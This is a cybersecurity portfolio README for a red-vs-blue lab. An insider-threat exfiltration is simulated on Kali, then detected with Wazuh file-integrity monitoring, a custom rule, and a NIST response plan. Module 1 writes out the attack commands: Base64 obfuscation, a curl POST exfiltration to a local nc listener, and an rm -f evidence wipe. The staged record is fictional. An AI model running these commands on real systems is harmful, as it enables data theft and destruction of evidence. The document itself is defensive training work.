<div align="center">

# ⚔️ SOC Red vs Blue Capstone

**Project 13 of 18 — Blue Team Internship Portfolio**

Insider Threat Simulation · FIM Threat Hunting · Custom Detection Engineering · NIST IR

![Wazuh](https://img.shields.io/badge/Wazuh_Cloud-3AAFDA?style=for-the-badge)
![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK-C6501F?style=for-the-badge)
![NIST](https://img.shields.io/badge/NIST_SP_800--61-2E4053?style=for-the-badge)
![CyberChef](https://img.shields.io/badge/CyberChef-2EA043?style=for-the-badge)
![Cost](https://img.shields.io/badge/Cost-Free-2EA043?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=for-the-badge)

A full insider-threat attack simulated on one side, and investigated, decoded, and permanently detected on the other.

### [📑 Open the visual index](INDEX.md)

</div>

---

## 📑 Table of Contents

1. [At a Glance](#at-a-glance)
2. [Project Background](#project-background)
3. [Environment](#environment)
4. [Attack Chain](#attack-chain)
5. [Project Flow](#project-flow)
6. [Module 1 — Red Team Execution](#module-1)
7. [Module 2 — FIM Threat Hunting](#module-2)
8. [Module 3 — Decoding the Evidence](#module-3)
9. [Module 4 — Detection Engineering](#module-4)
10. [Module 5 — Containment, Eradication & Recovery](#module-5)
11. [Coverage Snapshot](#coverage-snapshot)
12. [Command Reference](#command-reference)
13. [Project Summary](#project-summary)
14. [Challenges & Fixes](#challenges-fixes)
15. [Scope & Limitations](#scope-limitations)
16. [What I Learned](#what-i-learned)
17. [Skills Demonstrated](#skills-demonstrated)
18. [Screenshot Index](#screenshot-index)
19. [Repo Structure](#repo-structure)

---

<a id="at-a-glance"></a>
## 📊 At a Glance

| 🧩 Attack Stages | 🖼️ Screenshots | 🎯 Custom Rules Written | 🔍 Wazuh Rules Observed | 💰 Cost |
|:---:|:---:|:---:|:---:|:---:|
| **4** | **5** | **1** | **3 (550 / 5402 / 100050)** | **$0** |

---

<a id="project-background"></a>
## 📖 Project Background

**What happened:** A simulated rogue employee ("insider threat") on a company endpoint accessed a confidential client database, disguised the file to avoid detection, sent it out over HTTP POST (to a local listener in this lab), and then ran a command intended to delete the files and hide the evidence.

**What was done about it:** The attack activity was reconstructed using File Integrity Monitoring (FIM) logs and system audit logs. The exact content of the disguised file was recovered and confirmed using a decoding tool. A new, permanent detection rule was written and tested so this specific technique will trigger an immediate high-priority alert if attempted again.

> [!IMPORTANT]
> **Platform substitution, disclosed directly:** The task brief specifies a Windows endpoint (PowerShell, `certutil.exe`, `C:\Espionage`). No functioning Windows VM was available after repeated setup failures (corrupted VM image, account lockout). The entire simulation was instead executed on a **Kali Linux** endpoint enrolled as a Wazuh agent, using direct Bash equivalents of every Windows command in the brief (`/root/Espionage` in place of `C:\Espionage`). Every detection concept, MITRE technique, and analysis step is unchanged — only the OS-specific syntax differs.

| Task Block | Status | Note |
|---|:---:|---|
| Phase One — Attack Simulation | ✅ Complete | File staged, disguised, sent by HTTP POST; cleanup `rm` command run and logged |
| Task 1 — FIM Threat Hunting | ✅ Complete | File changes confirmed via rule 550; the `rm` command captured via sudo audit log (rule 5402) |
| Task 2 — Decoding the Evidence | ✅ Complete | Disguised file content fully recovered via CyberChef |
| Task 3 — Detection Engineering | ✅ Complete | Custom rule 100050 written, deployed, and confirmed firing on a live test |

---

<a id="environment"></a>
## 🖧 Environment

| Item | Value |
|---|---|
| **Attack Platform** | Kali Linux (substituted for a Windows endpoint — see above) |
| **SIEM** | Fresh Wazuh Cloud trial environment |
| **Agent Name** | `kali` |
| **Staging Directory** | `/root/Espionage` (substituted for `C:\Espionage`) |
| **FIM Mode** | `realtime` in Exhibit 1; `whodata` in Exhibit 5 |
| **Exfiltration Method** | HTTP POST to a local listener (`nc -lvnp 8080`), command only |
| **Custom Rule** | 100050, Level 10, chained on parent rule 550, MITRE `T1027` |
| **Incident Date** | September 12, 2026, 16:36–18:35 PKT (alerts in Exhibits 1, 2 and 5) |
| **IR Framework** | NIST SP 800-61 |

---

<a id="attack-chain"></a>
## 🔗 Attack Chain

```mermaid
%%{init: {'theme': 'base', 'themeVariables': {'fontSize': '14px'}, 'flowchart': {'nodeSpacing': 24, 'rankSpacing': 34, 'padding': 8}}}%%
flowchart LR
    S["1️⃣ Stage<br/>Client_Database.txt"]:::red --> O["2️⃣ Obfuscate<br/>Base64 → system_cache.b64"]:::red
    O --> E["3️⃣ Exfiltrate<br/>HTTP POST to listener"]:::red
    E --> D["4️⃣ Delete<br/>rm -f /root/Espionage/*"]:::red
    S -.->|Rule 550| F1["🔵 FIM creation alert"]:::blue
    O -.->|Rule 550| F1
    D -.->|Rule 5402| F2["🔵 Sudo audit log of the rm command"]:::blue
    classDef red fill:#943126,stroke:#571C16,stroke-width:2px,color:#FFFFFF
    classDef blue fill:#117864,stroke:#083D33,stroke-width:2px,color:#FFFFFF
    linkStyle default stroke:#2C3E50,stroke-width:2px
```

---

<a id="project-flow"></a>
## ⏱️ Project Flow

```mermaid
%%{init: { 'theme': 'base', 'themeVariables': {
  'doneTaskBkgColor':'#117864', 'doneTaskBorderColor':'#083D33',
  'sectionBkgColor':'#D6DBDF', 'altSectionBkgColor':'#EAECEE',
  'taskTextColor':'#FFFFFF', 'taskTextOutsideColor':'#1B2631',
  'taskTextLightColor':'#FFFFFF',
  'titleColor':'#1B2A4A', 'fontSize':'18px'
}}}%%
gantt
    title Project Flow — Five Modules
    dateFormat YYYY-MM-DD
    axisFormat %b %d
    section Red Team
    Module 1 - Red team execution (stage-obfuscate-exfil-delete)  :done, 2026-09-12, 1d
    section Blue Team
    Module 2 - FIM threat hunting and timeline reconstruction     :done, 2026-09-12, 1d
    Module 3 - Decoding the staged file content                    :done, 2026-09-12, 1d
    Module 4 - Custom detection rule engineering and live test    :done, 2026-09-12, 1d
    section Response
    Module 5 - Containment, eradication and recovery plan         :done, 2026-09-12, 1d
```

---

<a id="module-1"></a>
## 🔴 Module 1 — Red Team Execution

**Objective:** Execute the four-stage insider threat scenario exactly as specified — stage, obfuscate, exfiltrate, delete — generating the log evidence Module 2 investigates.

### Step 1 — Stage the confidential file ✅

```
echo 'CLIENT: Cyberster | ACCT: 4459 | PW: AdminPassword2026!' | \
sudo tee /root/Espionage/Client_Database.txt
```

### Step 2 — Obfuscate via Base64 encoding ✅

```
sudo base64 /root/Espionage/Client_Database.txt | \
sudo tee /root/Espionage/system_cache.b64
```

Functional equivalent of the brief's `certutil.exe -encode` step — both produce a Base64-encoded copy under an innocuous filename intended to blend in with legitimate system files.

### Step 3 — Exfiltrate over HTTP POST ✅

```
sudo nc -lvnp 8080                                              # listener (attacker side)
sudo curl -X POST --data-binary @/root/Espionage/system_cache.b64 \
  http://127.0.0.1:8080                                          # exfiltration (victim side)
```

### Step 4 — Anti-forensics cleanup ✅

```
sudo rm -f /root/Espionage/*
```

The attacker's working assumption is that deleting the files destroys the evidence. The exact command line was captured by the sudo audit log — see Module 2, Step 6.

---

<a id="module-2"></a>
## 🔵 Module 2 — FIM Threat Hunting

**Objective:** Locate the log events showing the staging, obfuscation and cleanup activity, and build a timeline mapping each event to its file path, timestamp, agent, and user context.

### Step 5 — Confirm file changes via Rule 550 ✅

Filtering Discover to `rule.id: 550` returned two FIM events: `system_cache.b64` (`size_after` 77, `sha1_after` `960ce02b…009036`) and a second event with `size_after` 56, the size of `Client_Database.txt`. Rule 550 is the *integrity checksum changed* (modified) rule: the `system_cache.b64` event carries an `mtime_before` of 16:10:15, so that file already existed from an earlier attempt in the same session.

<p align="center">
  <img src="screenshots/ss-01-fim-creation-alerts-rule550.PNG" alt="Exhibit 1 - FIM creation alerts rule 550" width="850"><br>
  <em>Exhibit 1 (Figure 4.1) — Wazuh Discover, rule.id: 550. Two FIM events at 16:36: <code>system_cache.b64</code> (size 77, SHA1 hash, mtime) and a second event (size 56)</em>
</p>

### Step 6 — Capture the cleanup command via the sudo audit log ✅

To see what was actually run, the **sudo command audit trail (rule 5402)** was queried, and returned the exact command line.

<p align="center">
  <img src="screenshots/ss-02-sudo-audit-deletion-rule5402.PNG" alt="Exhibit 2 - Sudo audit deletion log rule 5402" width="850"><br>
  <em>Exhibit 2 (Figure 4.2) — Wazuh Discover, rule.id: 5402 AND data.command: *rm*. One hit at 17:44:56: <code>/usr/bin/rm -f /root/Espionage/*</code> executed by <code>malaikaazhar</code> via sudo on agent <code>kali</code> — capturing the anti-forensics step with full command line and timestamp</em>
</p>

### 🕒 Reconstructed Timeline

| Attack Step | Evidence | File Path | Detection Method |
|---|---|---|---|
| 1. Stage file | syscheck event, rule 550 (size 56) | `/root/Espionage/Client_Database.txt` | FIM (native) |
| 2. Obfuscate (Base64) | syscheck event, rule 550 | `/root/Espionage/system_cache.b64` | FIM (native) |
| 3. Exfiltrate | `curl` POST command (Step 3); payload content decoded in Exhibit 3 | `/root/Espionage/system_cache.b64` | Command + decode |
| 4. Delete evidence (command run) | Sudo audit log, rule 5402 | `/root/Espionage/*` | Command audit |

🎯 **Why a cleanup command would not erase the evidence:** Wazuh's FIM engine records file metadata (hash, size, owner, mtime) when a file is changed, and this record persists in the Manager's database independently of the file's later fate on disk. Separately, the OS's own command-execution logging (rule 5402) records the exact command run, regardless of whether the file-deletion-specific FIM rule also fires. Even a successful deletion removes the file from the filesystem, not from either of these two independent logging layers.

---

<a id="module-3"></a>
## 🟣 Module 3 — Decoding the Evidence

**Objective:** Prove not just that an encoded file was staged, but exactly what data it contained.

### Step 7 — Decode the captured payload in CyberChef ✅

The Base64 content of `system_cache.b64` was submitted to CyberChef's "From Base64" recipe.

<p align="center">
  <img src="screenshots/ss-03-cyberchef-base64-decode.PNG" alt="Exhibit 3 - CyberChef Base64 decode" width="850"><br>
  <em>Exhibit 3 (Figure 5.1) — CyberChef "From Base64" applied to the 76-character Base64 string. Output shows the exact client record, account number, and password string held in the obfuscated file</em>
</p>

🎯 **Result:** This decoded output is the primary forensic proof of impact — it moves the finding from *"an encoded file was staged"* to *"this exact client data was inside the encoded file."*

**Cross-checks (recomputed, reproducible):**

| Check | Expected | Seen in |
|---|---|---|
| `Client_Database.txt` size | 56 bytes (55-character record + newline) | Exhibit 3 output (56) |
| `system_cache.b64` size | 77 bytes (76 Base64 characters + newline) | Exhibits 1 and 5 (`size_after: 77`), Exhibit 3 input (76) |
| `system_cache.b64` SHA1 | `960ce02b440d3584055fd349be4fc67a71009036` | Exhibits 1 and 5 (`sha1_after`) |

Reproduce: `printf 'CLIENT: Cyberster | ACCT: 4459 | PW: AdminPassword2026!\n' | base64 | sha1sum`

---

<a id="module-4"></a>
## 🟢 Module 4 — Detection Engineering

**Objective:** Ensure this specific technique — staging a Base64-obfuscated file inside a sensitive directory — generates an immediate, high-priority alert on any future occurrence.

### Step 8 — Author custom rule 100050 ✅

```xml
<group name="local,syscheck,">
<rule id="100050" level="10">
  <if_sid>550</if_sid>
  <field name="file" type="pcre2">\.b64$</field>
  <field name="file" type="pcre2">/root/Espionage</field>
  <description>Suspicious .b64 encoded file created in Espionage directory - possible data staging for exfiltration</description>
  <mitre><id>T1027</id></mitre>
  <group>data_exfiltration,</group>
</rule>
</group>
```

<p align="center">
  <img src="screenshots/ss-04-custom-rule-100050-source.PNG" alt="Exhibit 4 - Custom rule 100050 source" width="850"><br>
  <em>Exhibit 4 (Figure 6.1) — <code>local_rules.xml</code> as deployed in the Wazuh Rules editor: rule 100050 chained on parent rule 550, matching only <code>.b64</code> files inside <code>/root/Espionage</code>, Level 10, MITRE T1027</em>
</p>

The rule was deliberately set to **Level 10**: an encoded file appearing in this directory has effectively no legitimate business explanation once the parent FIM event and the filename/path conditions are all satisfied together — that's what justifies a real-time notification severity rather than a lower, log-only level.

### Step 9 — Verify the rule fires on a live re-test ✅

After deploying the rule and reloading the ruleset, Module 1's staging and encoding steps were re-executed to confirm the custom rule fires alongside the standard FIM alert.

<p align="center">
  <img src="screenshots/ss-05-custom-rule-100050-firing.PNG" alt="Exhibit 5 - Custom rule 100050 firing" width="850"><br>
  <em>Exhibit 5 (Figure 6.2) — Wazuh Discover, rule.id: 100050. One hit against <code>/root/Espionage/system_cache.b64</code> — verifying the rule is live, syntactically valid, and functioning as designed</em>
</p>

> [!NOTE]
> The hit in Exhibit 5 is a **modification** event (`mtime_before` 17:11:30, `mtime_after` 18:35:33), because the file already existed. Rule 100050 is chained on 550 (integrity checksum changed) and was tested on this modification event.

🎯 **Why chain on `if_sid` 550 instead of writing an independent rule?** Chaining onto the parent FIM rule means this custom rule only ever evaluates events syscheck has already confirmed are genuine file integrity changes, inheriting its reliability without duplicating file-monitoring logic — the custom rule stays focused purely on the pattern that matters (extension + path).

---

<a id="module-5"></a>
## 🟡 Module 5 — Containment, Eradication & Recovery

**Objective:** Document how a real enterprise SOC would respond to this confirmed incident (not the lab steps performed above).

| Phase | Action |
|---|---|
| **Containment** | Suspend (not delete) the compromised account, preserving it for forensic review. Forcibly terminate active sessions. Restrict the endpoint to an isolated VLAN reachable only by IR — keeping it available for live forensic capture rather than powering it off, which would destroy volatile memory evidence. Block the destination IP/listener at the perimeter immediately. |
| **Eradication** | Check for newly created scheduled tasks/cron jobs, new or modified accounts, unauthorized SSH keys, and unauthorized startup services. Run a full AV/EDR scan. Recalculate the FIM baseline only after confirming no unauthorized changes remain. |
| **Recovery** | Reactivate the account only after a password reset and MFA enrollment, with HR/legal informed given the insider-threat nature. Return the endpoint to its normal network segment only after clean eradication checks and a follow-up FIM scan. Leave the custom rule (100050) permanently deployed and add this incident to the organization's detection test suite for periodic re-verification. |

---

<a id="coverage-snapshot"></a>
## 🌟 Coverage Snapshot

| 🛡️ Phase | ✅ Status | 📌 Detail |
|---|---|---|
| Red Team Execution | Complete | Four-stage scenario run on Kali; staging and Base64 seen by FIM, cleanup command logged |
| FIM Threat Hunting | Complete | File changes confirmed (550); `rm` command captured (5402) |
| Evidence Decoding | Complete | Exact staged-file content recovered via CyberChef |
| Detection Engineering | Complete | Rule 100050 written, deployed, and live-fire verified |
| IR Documentation | Written plan | NIST SP 800-61 containment, eradication and recovery plan — not exercised in the lab |

### 🧾 What the Evidence Proves

```mermaid
%%{init: {'theme': 'base', 'themeVariables': {'fontSize': '14px'}, 'flowchart': {'nodeSpacing': 24, 'rankSpacing': 34, 'padding': 8}}}%%
flowchart LR
    M1["🔴 Module 1<br/>Red Team"]:::m1 --> P1["✅ Proven<br/>staging + Base64 seen by FIM"]:::ok
    M2["🔵 Module 2<br/>FIM Hunting"]:::m2 --> P2["✅ Proven<br/>file changes + rm command captured"]:::ok
    M3["🟣 Module 3<br/>Decoding"]:::m3 --> P3["✅ Proven<br/>exact staged-file content"]:::ok
    M4["🟢 Module 4<br/>Detection"]:::m4 --> P4["✅ Proven<br/>rule 100050 fires live (modification event)"]:::ok
    classDef m1 fill:#943126,stroke:#571C16,stroke-width:2px,color:#FFFFFF
    classDef m2 fill:#117864,stroke:#083D33,stroke-width:2px,color:#FFFFFF
    classDef m3 fill:#76448A,stroke:#432752,stroke-width:2px,color:#FFFFFF
    classDef m4 fill:#1E8449,stroke:#0E4A28,stroke-width:2px,color:#FFFFFF
    classDef ok fill:#1E8449,stroke:#0E4A28,stroke-width:2px,color:#FFFFFF
    linkStyle default stroke:#2C3E50,stroke-width:2px
```

---

<a id="command-reference"></a>
## 🧰 Command Reference

| # | Command | Used In | Purpose |
|:---:|---|---|---|
| 1 | `echo '...' \| sudo tee Client_Database.txt` | Module 1 | Stage the confidential test file |
| 2 | `sudo base64 ... \| sudo tee system_cache.b64` | Module 1 | Obfuscate the file (equivalent of `certutil.exe -encode`) |
| 3 | `sudo nc -lvnp 8080` / `sudo curl -X POST --data-binary @...` | Module 1 | Exfiltration listener and HTTP POST send |
| 4 | `sudo rm -f /root/Espionage/*` | Module 1 | Anti-forensics cleanup command (captured by rule 5402 — see Module 2, Step 6) |
| 5 | CyberChef "From Base64" | Module 3 | Decode the Base64 content of the staged file |
| 6 | `<if_sid>550</if_sid>` + `pcre2` file match | Module 4 | Chain custom rule 100050 onto the parent FIM rule |

---

<a id="project-summary"></a>
## 📝 Project Summary

| Module | Tooling | Key Outcome |
|---|---|---|
| Module 1 — Red Team Execution | Bash, `base64`, `nc`, `curl` | Four-stage scenario run on Kali (substituted for Windows) |
| Module 2 — FIM Threat Hunting | Wazuh Discover, rules 550 / 5402 | File changes confirmed natively; `rm` command captured via 5402 |
| Module 3 — Decoding the Evidence | CyberChef | Exact staged client record recovered from the Base64 file content |
| Module 4 — Detection Engineering | `local_rules.xml`, rule 100050 | Permanent high-priority rule written, deployed, and live-fire verified |
| Module 5 — IR Documentation | NIST SP 800-61 | Written containment/eradication/recovery plan (not exercised in the lab) |

---

<a id="challenges-fixes"></a>
## ⚠️ Challenges & Fixes

| ❌ Challenge | ✅ Fix |
|---|---|
| No functioning Windows VM (corrupted image, account lockout) | Substituted Kali Linux with direct Bash equivalents of every Windows command — disclosed explicitly, not hidden |

---

<a id="scope-limitations"></a>
## 🚧 Scope & Limitations

- **Platform substitution:** Kali Linux was used in place of the specified Windows endpoint due to environment failures. All detection concepts and MITRE mappings are unchanged — only OS-specific syntax differs.
- **Stage 4 scope:** Only the `rm` command line is evidenced (Exhibit 2). The outcome of the deletion and FIM deletion rule 553 are not covered in this project.
- **Rule 100050 tested on a modification event:** It is chained on rule 550 (integrity checksum changed) and was verified firing on a modification event (Exhibit 5).
- **IR plan is written, not exercised:** Module 5 describes how a real SOC would respond; it was not carried out in the lab.
- **Local listener, not a real external destination:** The exfiltration command targeted `127.0.0.1:8080`, not an actual external network endpoint — a lab simulation of the technique, not a real data-loss event.
- **Fictional test data only:** The "client record" staged and sent was fictional data created for this exercise, not real client information.

---

<a id="what-i-learned"></a>
## 🧠 What I Learned

- **Command-level audit logs add a second view.** Rule 5402 recorded the exact cleanup command line, independent of the file-integrity events from rule 550.
- **A platform substitution should be disclosed, not hidden.** Running on Kali instead of Windows doesn't change the underlying concepts being tested, but it's stated explicitly at the point it occurred.
- **Deleting a file doesn't delete its evidence.** FIM metadata and command-execution logs are independent of the file's fate on disk — an attacker's cleanup step removes the file, not the two separate log trails that already recorded it.
- **Chaining a custom rule on a parent rule keeps detection logic honest.** Rule 100050 only evaluates events syscheck already confirmed as genuine — it doesn't duplicate detection logic, it narrows an already-reliable signal.

---

<a id="skills-demonstrated"></a>
## 🛠️ Skills Demonstrated

- Executing an insider-threat attack chain (staging, obfuscation, exfiltration) on a Kali endpoint
- FIM-based threat hunting and cross-log timeline reconstruction
- Using command-level audit logging (rule 5402) alongside FIM to reconstruct attacker actions
- Forensic Base64 decoding to confirm exact data impact
- Writing and live-verifying a custom Wazuh rule chained on a parent FIM rule, mapped to MITRE ATT&CK
- Structuring a written incident response plan around NIST SP 800-61 (containment, eradication, recovery)
- Disclosing environment substitutions and project scope directly

---

<a id="screenshot-index"></a>
## 🖼️ Screenshot Index

| # | File | Shows |
|:---:|---|---|
| 1 | `ss-01-fim-creation-alerts-rule550.PNG` | Rule 550 FIM creation alerts for both staged files |
| 2 | `ss-02-sudo-audit-deletion-rule5402.PNG` | Rule 5402 sudo audit log capturing the `rm -f` cleanup command |
| 3 | `ss-03-cyberchef-base64-decode.PNG` | CyberChef decoding the Base64 file content |
| 4 | `ss-04-custom-rule-100050-source.PNG` | Custom rule 100050 source in the Wazuh Rules editor |
| 5 | `ss-05-custom-rule-100050-firing.PNG` | Rule 100050 confirmed firing on a live re-test |

---

<a id="repo-structure"></a>
## 📁 Repo Structure

```text
project-13-soc-redvsblue-capstone/
|-- README.md
|-- INDEX.md
`-- screenshots/
    |-- ss-01-fim-creation-alerts-rule550.PNG
    |-- ss-02-sudo-audit-deletion-rule5402.PNG
    |-- ss-03-cyberchef-base64-decode.PNG
    |-- ss-04-custom-rule-100050-source.PNG
    `-- ss-05-custom-rule-100050-firing.PNG
```

<div align="center">

🛡️ **[Wazuh](https://wazuh.com)** · 🐉 **[Kali Linux](https://www.kali.org)** · 🧪 **[CyberChef](https://gchq.github.io/CyberChef/)** · 🧭 **[MITRE ATT&CK](https://attack.mitre.org)** · 📘 **[NIST SP 800-61](https://csrc.nist.gov/pubs/sp/800/61/r2/final)**

</div>
